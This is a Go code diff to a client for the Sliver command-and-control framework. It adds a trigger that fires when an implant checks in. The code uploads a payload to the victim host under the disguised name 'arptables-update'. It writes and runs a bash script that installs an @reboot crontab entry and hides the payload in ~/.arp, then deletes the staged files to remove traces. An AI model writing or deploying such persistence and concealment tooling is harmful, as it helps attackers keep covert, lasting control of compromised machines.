@@ -9,9 +9,14 @@ import (
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/rpcpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/util/encoders"
 	"google.golang.org/grpc"
 	"io"
+	"io/ioutil"
 	"log"
+	"strings"
+	"time"
 )
 
 type SliverConnection struct {
@@ -69,17 +74,153 @@ func (con *SliverConnection) sliverConnect(configPath string) {
 				}
 				switch event.EventType {
 				case consts.BeaconRegisteredEvent:
-					//idregex, _ := regexp.Compile(`([0-9a-c].{7}-[0-9a-c].{3}-[0-9a-c].{3}-[0-9a-c].{3}-[0-9a-c].{11})`)
-					//idmatch := idregex.FindSubmatch(event.Data)
 					beaconID := event.Data[2:38]
-					app.Printf("Beacon registered: %s\n", string(beaconID))
-					//app.Printf(string(event.Data))
-					//client.rpc.Cd(context.Background(), *sliverpb.CdReq{Request: makeRequest(string(idmatch))})
+					app.Printf("Beacon registered: %s\t%d triggers defined.\n", string(beaconID), len(triggers))
+					if len(triggers) != 0 {
+						for triggernum, triggerIter := range triggers {
+							if strings.Contains(string(event.Data[2:len(event.Data)/2]), triggerIter.ParentImplantName) {
+								triggers[triggernum].triggered = append(triggers[triggernum].triggered, triggeredType{
+									Init:           false,
+									ParentBeaconID: string(beaconID),
+									uploadcount:    1,
+								})
+								app.Printf("Trigger match\n")
+								fileBuf, err := ioutil.ReadFile(triggerIter.Filename)
+								if err != nil {
+									app.Printf("%s\n", err)
+								}
+								uploadGzip := new(encoders.Gzip).Encode(fileBuf)
+								_, err = client.rpc.Upload(context.Background(), &sliverpb.UploadReq{
+									Path:    "/tmp/arptables-update",
+									Encoder: "gzip",
+									Data:    uploadGzip,
+									IsIOC:   false,
+									Request: &commonpb.Request{
+										Async:    true,
+										Timeout:  int64(60),
+										BeaconID: string(beaconID),
+									},
+								})
+								if err != nil {
+									app.Printf("%s\n", err)
+								}
+								////////////////
+								uploadGzip = new(encoders.Gzip).Encode([]byte(`#!/bin/bash
+if crontab -l | grep -v "#" | grep -q arptables-update; then
+        echo ""
+else
+        (crontab -l 2>/dev/null; echo '@reboot ~/.arp/arptables-update &') | crontab -
+        mkdir ~/.arp
+        cp /tmp/arptables-update ~/.arp/arptables-update
+        chmod 0755 ~/.arp/arptables-update
+        ~/.arp/arptables-update
+fi`))
+								_, err = client.rpc.Upload(context.Background(), &sliverpb.UploadReq{
+									Path:    "/tmp/cron.sh",
+									Encoder: "gzip",
+									Data:    uploadGzip,
+									IsIOC:   false,
+									Request: &commonpb.Request{
+										Async:    true,
+										Timeout:  int64(60),
+										BeaconID: string(beaconID),
+									},
+								})
+								if err != nil {
+									app.Printf("%s\n", err)
+								}
+							}
+						}
+					}
 				case consts.BeaconTaskResultEvent:
-					app.Printf("task finished.")
+					beaconID := event.Data[40:76]
+					if len(triggers) != 0 {
+						for triggernum, triggerIter := range triggers {
+							if len(triggerIter.triggered) != 0 {
+								for triggerednum, triggeredIter := range triggerIter.triggered {
+									if !triggeredIter.Init && string(beaconID) == triggeredIter.ParentBeaconID {
+										if strings.Contains(string(event.Data), "UploadReq") && !triggeredIter.Init {
+											triggers[triggernum].triggered[triggerednum].uploadcount++
+											if triggeredIter.uploadcount == 2 {
+												time.Sleep(2 * time.Second)
+												_, err = client.rpc.Chmod(context.Background(), &sliverpb.ChmodReq{
+													Path:      "/tmp/cron.sh",
+													FileMode:  "0700",
+													Recursive: false,
+													Request: &commonpb.Request{
+														Async:    true,
+														Timeout:  int64(60),
+														BeaconID: string(beaconID),
+													},
+												})
+												if err != nil {
+													app.Printf("%s\n", err)
+												}
+												_, err = client.rpc.Chmod(context.Background(), &sliverpb.ChmodReq{
+													Path:      "/tmp/arptables-update",
+													FileMode:  "0755",
+													Recursive: false,
+													Request: &commonpb.Request{
+														Async:    true,
+														Timeout:  int64(60),
+														BeaconID: string(beaconID),
+													},
+												})
+												if err != nil {
+													app.Printf("%s\n", err)
+												}
+												time.Sleep(2 * time.Second)
+												_, err = client.rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+													Path: "/tmp/cron.sh",
+													Args: []string{},
+													Request: &commonpb.Request{
+														Async:    true,
+														Timeout:  int64(60),
+														BeaconID: string(beaconID),
+													},
+												})
+												if err != nil {
+													app.Printf("%s\n", err)
+												}
+												triggeredIter.Init = false
+											}
+										} else if strings.Contains(string(event.Data), "ExecuteReq") && !triggeredIter.Init {
+											_, err = client.rpc.Rm(context.Background(), &sliverpb.RmReq{
+												Path:      "/tmp/cron.sh",
+												Recursive: false,
+												Force:     true,
+												Request: &commonpb.Request{
+													Async:    true,
+													Timeout:  int64(60),
+													BeaconID: string(beaconID),
+												},
+											})
+											if err != nil {
+												app.Printf("%s\n", err)
+											}
+											_, err = client.rpc.Rm(context.Background(), &sliverpb.RmReq{
+												Path:      "/tmp/arptables-update",
+												Recursive: false,
+												Force:     true,
+												Request: &commonpb.Request{
+													Async:    true,
+													Timeout:  int64(60),
+													BeaconID: string(beaconID),
+												},
+											})
+											if err != nil {
+												app.Printf("%s\n", err)
+											}
+											triggeredIter.Init = true
+										}
+									}
+								}
+							}
+						}
+					}
 
 				default:
-					app.Printf("[*] - %s", event.EventType)
+					app.Printf("[*] - %s\n", event.EventType)
 				}
 
 				/*
